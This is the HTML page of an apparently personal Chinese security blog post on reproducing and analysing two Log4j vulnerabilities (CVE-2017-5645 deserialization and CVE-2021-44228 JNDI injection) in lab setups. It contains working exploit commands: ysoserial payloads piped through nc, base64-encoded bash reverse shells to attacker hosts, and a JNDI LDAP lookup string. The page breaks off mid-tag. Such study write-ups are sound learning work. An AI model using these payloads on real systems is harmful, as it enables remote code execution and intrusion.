@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>java安全 Log4j - ThnPinkman’s blog</title><meta name="Description" content="只是向上走"><meta property="og:url" content="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-log4j/">
+  <meta property="og:site_name" content="ThnPinkman’s blog">
+  <meta property="og:title" content="java安全 Log4j">
+  <meta property="og:description" content="前言 log4j 之前有试了试利用，可能出现一些玄学当时也没复现出来。ctf题目也遇到过直接打的情况。
+学了一些java安全基础后打算再来学习一波。
+log4j有啥作用 log4j是Apache的一个开放源代码的项目，通过使用log4j，我们可以控制日志信息
+能够控制日志信息想往哪里打就往哪里打，比如：控制台、文件、邮箱、数据库等等。 能够控制日志信息想怎么打就怎么打，比如：我想要打印时间、程序的名称、程序的方法名、程序的行号、线程的名称等等。 能够控制日志信息想打什么打什么，不想打的就不打，日志信息是分级别的，有时候我只想看错误的信息或者警告的信息，有时候我想看到所有的信息我想调试程序等等。 具体可看https://cloud.tencent.com/developer/article/1455713
+Apache Log4j Server 反序列化命令执行漏洞 -CVE-2017-5645 Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。
+漏洞环境 Log4j 2.x &lt;= 2.8.1
+复现环境
+jdk1.7Log4j-api，Log4j-core 2.8.1commons-collections 3.1 pom.xml
+&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-api&lt;/artifactId&gt; &lt;version&gt;2.8.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.8.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt; 关于java版本的更换，这次使用jenv来试试
+https://github.com/FelixSelter/JEnv-for-Windowshttps://blog.csdn.net/xhy18634297976/article/details/127454312不过idea的jdk还是需要自己更换了
+漏洞利用 import org.apache.logging.log4j.core.net.server.ObjectInputStreamLogEventBridge; import org.apache.logging.log4j.core.net.server.TcpSocketServer; import java.io.IOException; public class Log4jDemo { public static void main(String[] args) { TcpSocketServer myServer = null; try { myServer = new TcpSocketServer(4444,new ObjectInputStreamLogEventBridge()); } catch (IOException e) { throw new RuntimeException(e); } myServer.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-20T22:54:49+08:00">
+    <meta property="article:modified_time" content="2024-08-20T22:54:49+08:00">
+    <meta property="article:tag" content="Java">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="java安全 Log4j">
+  <meta name="twitter:description" content="前言 log4j 之前有试了试利用，可能出现一些玄学当时也没复现出来。ctf题目也遇到过直接打的情况。
+学了一些java安全基础后打算再来学习一波。
+log4j有啥作用 log4j是Apache的一个开放源代码的项目，通过使用log4j，我们可以控制日志信息
+能够控制日志信息想往哪里打就往哪里打，比如：控制台、文件、邮箱、数据库等等。 能够控制日志信息想怎么打就怎么打，比如：我想要打印时间、程序的名称、程序的方法名、程序的行号、线程的名称等等。 能够控制日志信息想打什么打什么，不想打的就不打，日志信息是分级别的，有时候我只想看错误的信息或者警告的信息，有时候我想看到所有的信息我想调试程序等等。 具体可看https://cloud.tencent.com/developer/article/1455713
+Apache Log4j Server 反序列化命令执行漏洞 -CVE-2017-5645 Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。
+漏洞环境 Log4j 2.x &lt;= 2.8.1
+复现环境
+jdk1.7Log4j-api，Log4j-core 2.8.1commons-collections 3.1 pom.xml
+&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-api&lt;/artifactId&gt; &lt;version&gt;2.8.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.8.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt; 关于java版本的更换，这次使用jenv来试试
+https://github.com/FelixSelter/JEnv-for-Windowshttps://blog.csdn.net/xhy18634297976/article/details/127454312不过idea的jdk还是需要自己更换了
+漏洞利用 import org.apache.logging.log4j.core.net.server.ObjectInputStreamLogEventBridge; import org.apache.logging.log4j.core.net.server.TcpSocketServer; import java.io.IOException; public class Log4jDemo { public static void main(String[] args) { TcpSocketServer myServer = null; try { myServer = new TcpSocketServer(4444,new ObjectInputStreamLogEventBridge()); } catch (IOException e) { throw new RuntimeException(e); } myServer.">
+<meta name="application-name" content="ThnPinkman&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="ThnPinkman&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-log4j/" /><link rel="prev" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-fastjson/" /><link rel="next" href="https://thnpkm.github.io/posts/java%E5%AE%89%E5%85%A8/java%E5%AE%89%E5%85%A8-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E4%B8%8E%E5%AD%97%E8%8A%82%E7%A0%81/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "java安全 Log4j",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/thnpkm.github.io\/posts\/java%E5%AE%89%E5%85%A8\/java%E5%AE%89%E5%85%A8-log4j\/"
+        },"genre": "posts","keywords": "java","wordcount":  232 ,
+        "url": "https:\/\/thnpkm.github.io\/posts\/java%E5%AE%89%E5%85%A8\/java%E5%AE%89%E5%85%A8-log4j\/","datePublished": "2024-08-20T22:54:49+08:00","dateModified": "2024-08-20T22:54:49+08:00","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "https:\/\/thnpkm.github.io\/1651835469576.jpg"},"author": {
+                "@type": "Person",
+                "name": "Author"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="ThnPinkman’s blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.github.io/1651835469576.jpg"
+        data-srcset="https://thnpkm.github.io/1651835469576.jpg, https://thnpkm.github.io/1651835469576.jpg 1.5x, https://thnpkm.github.io/1651835469576.jpg 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.github.io/1651835469576.jpg"
+        title="https://thnpkm.github.io/1651835469576.jpg" />ThnPinkman&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">java安全 Log4j</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/java%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Java安全</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-08-20">2024-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;232 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#log4j有啥作用">log4j有啥作用</a></li>
+    <li><a href="#apache-log4j-server-反序列化命令执行漏洞--cve-2017-5645">Apache Log4j Server 反序列化命令执行漏洞 -CVE-2017-5645</a>
+      <ul>
+        <li><a href="#漏洞环境">漏洞环境</a></li>
+        <li><a href="#漏洞利用">漏洞利用</a></li>
+        <li><a href="#漏洞分析">漏洞分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#apache-log4j2-lookup-jndi-注入漏洞-cve-2021-44228">Apache Log4j2 lookup JNDI 注入漏洞-CVE-2021-44228</a>
+      <ul>
+        <li><a href="#漏洞环境-1">漏洞环境</a></li>
+        <li><a href="#漏洞利用-1">漏洞利用</a></li>
+        <li><a href="#漏洞分析-1">漏洞分析</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="前言">前言</h2>
+<p>log4j 之前有试了试利用，可能出现一些玄学当时也没复现出来。ctf题目也遇到过直接打的情况。</p>
+<p>学了一些java安全基础后打算再来学习一波。</p>
+<h2 id="log4j有啥作用">log4j有啥作用</h2>
+<p><strong>log4j是Apache的一个开放源代码的项目</strong>，通过使用log4j，我们<strong>可以控制日志信息</strong></p>
+<ul>
+<li>能够控制日志信息想往哪里打就往哪里打，比如：控制台、文件、邮箱、<a href="https://cloud.tencent.com/solution/database?from_column=20065&amp;from=20065" target="_blank" rel="noopener noreffer">数据库</a>
+等等。</li>
+<li>能够控制日志信息想怎么打就怎么打，比如：我想要打印时间、程序的名称、程序的方法名、程序的行号、线程的名称等等。</li>
+<li>能够控制日志信息想打什么打什么，不想打的就不打，日志信息是分级别的，有时候我只想看错误的信息或者警告的信息，有时候我想看到所有的信息我想调试程序等等。</li>
+</ul>
+<p>具体可看https://cloud.tencent.com/developer/article/1455713</p>
+<h2 id="apache-log4j-server-反序列化命令执行漏洞--cve-2017-5645">Apache Log4j Server 反序列化命令执行漏洞 -CVE-2017-5645</h2>
+<p>Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。</p>
+<h3 id="漏洞环境">漏洞环境</h3>
+<p>Log4j 2.x &lt;= 2.8.1</p>
+<p>复现环境</p>
+<pre tabindex="0"><code>jdk1.7
+Log4j-api，Log4j-core 2.8.1
+commons-collections 3.1
+</code></pre><p>pom.xml</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;groupId&gt;</span>org.apache.logging.log4j<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>log4j-api<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;version&gt;</span>2.8.1<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;groupId&gt;</span>org.apache.logging.log4j<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>log4j-core<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;version&gt;</span>2.8.1<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;groupId&gt;</span>commons-collections<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>commons-collections<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;version&gt;</span>3.1<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span></code></pre></div><p>关于java版本的更换，这次使用jenv来试试</p>
+<p><a href="https://github.com/FelixSelter/JEnv-for-Windows" target="_blank" rel="noopener noreffer">https://github.com/FelixSelter/JEnv-for-Windows</a>
+</p>
+<p><a href="https://blog.csdn.net/xhy18634297976/article/details/127454312" target="_blank" rel="noopener noreffer">https://blog.csdn.net/xhy18634297976/article/details/127454312</a>
+</p>
+<!-- raw HTML omitted -->
+<p>不过idea的jdk还是需要自己更换了</p>
+<h3 id="漏洞利用">漏洞利用</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.logging.log4j.core.net.server.ObjectInputStreamLogEventBridge;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.logging.log4j.core.net.server.TcpSocketServer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Log4jDemo</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) {
+</span></span><span style="display:flex;"><span>        TcpSocketServer myServer <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            myServer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> TcpSocketServer(4444,<span style="color:#66d9ef">new</span> ObjectInputStreamLogEventBridge());
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">catch</span> (IOException e) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> RuntimeException(e);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        myServer.<span style="color:#a6e22e">run</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>我们运行一下这个类，它会监听本地的4444端口，然后我们需要将数据传递进去</p>
+<p>使用<code>ysoserial</code>生成一条cc链，nc传给它即可触发漏洞：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>java -jar ysoserial-all.jar CommonsCollections1 <span style="color:#e6db74">&#34;calc&#34;</span> | nc 192.168.95.168 <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><p>本地环境不清楚出了啥问题，一直报错</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>ERROR org.<span style="color:#a6e22e">apache</span>.<span style="color:#a6e22e">logging</span>.<span style="color:#a6e22e">log4j</span>.<span style="color:#a6e22e">core</span>.<span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">server</span>.<span style="color:#a6e22e">TcpSocketServer</span>.<span style="color:#a6e22e">4445</span> <span style="color:#f92672">-</span> Exception encountered on accept.
+</span></span></code></pre></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="java%E5%AE%89%E5%85%A8%20Log4j.assets/image-20230927163606199.png"
+        data-srcset="java%E5%AE%89%E5%85%A8%20Log4j.assets/image-20230927163606199.png, java%E5%AE%89%E5%85%A8%20Log4j.assets/image-20230927163606199.png 1.5x, java%E5%AE%89%E5%85%A8%20Log4j.assets/image-20230927163606199.png 2x"
+        data-sizes="auto"
+        alt="java%E5%AE%89%E5%85%A8%20Log4j.assets/image-20230927163606199.png"
+        title="image-20230927163606199" /></p>
+<p>疯了 ，最后换了个jdk7u21 也一样</p>
+<p>使用vulhub的复现环境是写了新建了个文件，</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 <span style="color:#e6db74">&#34;touch /tmp/success&#34;</span> | nc 192.168.95.148 <span style="color:#ae81ff">4712</span>
+</span></span></code></pre></div><p>或者可以反弹shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 <span style="color:#e6db74">&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMTk2LjMvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}&#34;</span> | nc 192.168.95.148 <span style="color:#ae81ff">4712</span>
+</span></span></code></pre></div><p>但是我用vulhub的docker还是显示log4j环境有问题，</p>
+<p>复现还是出现问题，寄寄寄寄</p>
+<h3 id="漏洞分析">漏洞分析</h3>
+<!-- raw HTML omitted -->
+<p><code>TcpSocketServer#main()</code>方法  通过<code>createSerializedSocketServer()</code>创建了一个<code>socketServer</code></p>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Thread serverThread <span style="color:#f92672">=</span> socketServer.<span style="color:#a6e22e">startNewThread</span>();
+</span></span></code></pre></div><p>调用<code>startNewThread()</code>方法</p>
+<!-- raw HTML omitted -->
+<p>会调用线程的<code>start()</code>方法，于是我们跟进<code>TcpSocketServer#run()</code>方法中</p>
+<p>当调用线程的start方法时就会调用对应任务的run方法（想要使用子线程运行的类都要实现一个Runnable接口，要实现run方法）</p>
+<!-- raw HTML omitted -->
+<p>run()首先会判断socket是否关闭，然后调用<code>this.serverSocket.accept()</code>去接受数据，赋值给<code>clientSocket</code>变量，然后去调用<code>SocketHandler</code>的构造方法，返回一个<code>handler</code></p>
+<p>我们跟进一下<code>SocketHandler</code>类：</p>
+<!-- raw HTML omitted -->
+<p><code>SocketHandler</code>类是<code>TcpSocketServer</code>类的内部类，所以这里的<code>logEventIuput</code>的值就是我们传入的（<code>new ObjectInputStreamLogEventBridge()</code>）,这里调用了它的<code>warpStream</code>方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> ObjectInputStream <span style="color:#a6e22e">wrapStream</span>(InputStream inputStream) <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> ObjectInputStream(inputStream);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>就是把socket连接传过来的数据流作为包装成<code>ObjectInputStream</code>，现在<code>this.inputStream</code>就是一个来自用户输入的<code>ObjectInputStream</code>流了。回到<code>TcpSocketServer</code>的run方法，继续往下，执行了<code>handler.start()</code>而handler是<code>SocketHandler</code>类的实例，这个类继承自Log4jThread，Log4jThread又继承自Thread类，所以他是一个自定义的线程类，自定义的线程类有个特点，那就是必须重写run方法，而且当调用自定义线程类的start()方法时，会自动调用它的run()方法</p>
+<p>也就是调用<code>handler.start()</code>就会调用<code>SocketHandler#run()</code>方法：</p>
+<!-- raw HTML omitted -->
+<p>变量shutdown的值默认为false,所以进入while循环，会将前面的产生的<code>ObjectInputStream</code>对象传递给<code>this.logEventInput.logEvents()</code>方法中，我们跟进:</p>
+<p><code>ObjectInputStream</code>对象的<code>logEvents</code></p>
+<!-- raw HTML omitted -->
+<p>该方法会调用<code>inputStream#readObject()</code>方法进行反序列化，并且整个步骤没有任何过滤，因此当我们传入的数据为恶意的cc链就可以触发反序列化漏洞了</p>
+<h2 id="apache-log4j2-lookup-jndi-注入漏洞-cve-2021-44228">Apache Log4j2 lookup JNDI 注入漏洞-CVE-2021-44228</h2>
+<p>Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组件。</p>
+<p>当用户输入信息时，应用程序中的log4j2组件会将信息记录到日志中
+假如日志中含有该语句${jndi:ldap:192.168.96.1:1099/exp}，log4j就会去解析该信息，通过jndi的lookup()方法去解析该URL：ldap:192.168.96.1:1099/exp
+解析到ldap，就会去192.168.61.129:1099的ldap服务找名为shell的资源，如果找不到就会去http服务中找
+在http中找到shell之后，就会将资源信息返回给应用程序的log4j组件，而log4j组件就会下载下来，然后发现shell是一个.class文件，就会去执行里面的代码，从而实现注入
+攻击者就可以通过shell实现任意的命令执行，造成严重危害</p>
+<h3 id="漏洞环境-1">漏洞环境</h3>
+<p>jdk版本小于8u191、7u201、6u211</p>
+<p>Log4j 2.0到2.14.1</p>
+<p>Log4j2-2.14.1版本，maven的引用依赖参考如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;groupId&gt;</span>org.apache.logging.log4j<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>log4j-core<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;version&gt;</span>2.14.1<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;groupId&gt;</span>org.apache.logging.log4j<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>log4j-api<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;version&gt;</span>2.14.1<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span></code></pre></div><h3 id="漏洞利用-1">漏洞利用</h3>
+<p>通过vulhub来复现利用</p>
+<p>Apache Solr 8.11.0，其依赖了Log4j 2.14.1：</p>
+<!-- raw HTML omitted -->
+<p>kali：192.168.1.105</p>
+<p>使用<code>JNDI-Injection-Exploit</code>这个工具来起一个jndi服务</p>
+<p>我这里选择复现一下反弹shell， 选择jndi服务和 nc服务都开在kali上面</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>    java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span style="color:#e6db74">&#34;bash -c {echo,YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjEwNS80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}&#34;</span> -A <span style="color:#e6db74">&#34;192.168.1.105&#34;</span>
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<p>构造</p>
+<pre tabindex="0"><code>${jndi:ldap://192.168.1.105:1389/r3rh36}
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="java%E5%AE%89%E5%85%A8%20Log4j.assets/image-20230927201745462.png"
